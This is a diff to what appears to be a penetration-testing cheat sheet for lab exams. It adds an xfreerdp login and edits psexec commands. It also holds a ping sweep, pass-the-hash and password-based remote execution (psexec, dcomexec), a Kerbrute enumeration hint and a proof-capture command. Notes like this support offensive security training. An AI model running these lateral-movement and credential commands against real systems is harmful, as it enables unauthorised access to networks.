@@ -475,7 +475,8 @@ for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.200.%i > nul && echo 192.168
 ================================== 
 Remotes 
 
-psexec mydom/administrator:"password!"@192.168.200.5
+xfreerdp /v:192.168.200.5 /d:mike.com /u:mike /p:paxx -sec-nla +clipboard /geometry /w:1680 /h:900 
+psexec mydom/administrator:"paxx"@192.168.200.5
 psexec admin@192.168.200.5 -hashes aad3b435b51404:ee0c207898a5bc   
 psexec mydom/bob:Paxxword@192.168.200.5
 dcomexec.py mydom/administrator:"password!"@192.168.200.5
@@ -489,14 +490,12 @@ Usernames
 List of Users > Convert to usernames 
 https://github.com/PinkDraconian 
 Then Kerbrute, if you get a list of users. 
- 
+
  
 ================================== 
-Windows 
+Proof 
 type proof.txt && whoami && hostname && ipconfig 
- 
  
 ================================== 
 Consider
 mxsam mxpivot mxtransfer mxad
-
